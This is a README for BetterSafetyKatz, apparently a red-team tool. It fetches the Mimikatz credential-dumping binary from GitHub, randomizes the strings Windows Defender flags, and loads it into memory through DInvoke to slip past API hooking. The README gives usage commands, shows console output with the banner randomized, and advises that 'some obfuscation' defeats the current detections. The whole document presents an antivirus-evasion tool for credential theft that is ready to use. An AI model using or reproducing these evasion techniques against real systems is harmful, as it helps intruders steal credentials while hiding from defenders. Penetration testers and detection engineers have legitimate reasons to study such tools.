# BetterSafetyKatz?

This modified fork of SafetyKatz dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repo, 
runtime patching on detected signatures and uses SharpSploit DInvoke to get it into memory.

1. Gets the URL for the latest ZIP / PreCompiled Mimikatz binary directly from GitHub Repo
2. Unzipped in memory, turned into HEX. Then strings/signatures detected by Windows Defender are replaced with random strings of the same size 
    (Used https://github.com/matterpreter/DefenderCheck to gather signatures detected)
3. PE-Loaded into mem using SharpSploit 1.6 DInvoke, bypassing API hooking.(https://thewover.github.io/Dynamic-Invoke/)

Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9

[@harmj0y](https://twitter.com/harmj0y) is the primary author of the port that this repo is forked from.

BetterSafetyKatz is licensed under the BSD 3-Clause license.

## Detected?

BetterSafetyKatz has basic signature detections by now, some obfuscation will do the trick! 

	PS D:\Projects\NetLoader> .\BetterSafetyKatz.exe 
	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
	[+] Randomizing strings in memory
	[+] Suicide burn before CreateThread!

	  .#####.   022PO6WM 2.2.0 (x64) #19041 May 19 2020 00:48:59
	 .## ^ ##.  "2HREDZLQ6LC4KWE48WS" - (J888K)
	 ## / \ ##  /*** SX6HATY8UCZTFP `3I6B0MYQ03` ( 66OC8VHW@3I6B0MYQ03.com )
	 ## \ / ##       > http://blog.3I6B0MYQ03.com/022PO6WM
	 '## v ##'       KVY3O5BG9LH90CH             ( EWGZ4I5Z22719E0QZJTNFIJF )
	  '#####'        > VOIN6NBQ5J7P55TZBTT4H / WXFFZUHZ5JPERL93VZ3VC1W   ***/

	022PO6WM # coffee

		( (
		 ) )
	  .______.
	  |      |]
	  \      /
	   `----'

	022PO6WM #
	
You can also specify a remote OR local path to unzip yourself (Not contacting the master GitHub repo)

	PS D:\Tools\Katz> .\BetterSafetyKatz.exe '.\mimikatz_trunk.zip'                                         
	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
	[+] Fetching .\mimikatz_trunk.zip
	[+] Randomizing strings in memory
	[+] Suicide burn before CreateThread!

	  .#####.   83RMVZA8 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
	 .## ^ ##.  "FPN5DDHQGD5GF7M775W" - (AX8RH)
	 ## / \ ##  /*** 1HVUZ68IQYGG3I `EWE37C7HUD` ( R9ECUOAN@EWE37C7HUD.com )
	 ## \ / ##       > http://blog.EWE37C7HUD.com/83RMVZA8
	 '## v ##'       TTCPO5BUID45UFP             ( FD1XGKSOLS8XHA8DEW9X8VO9 )
	  '#####'        > K8IYUY2XSLBG3S3VXV8ZN / POCIYP0U92KNJYG463LVDYJ   ***/

	83RMVZA8
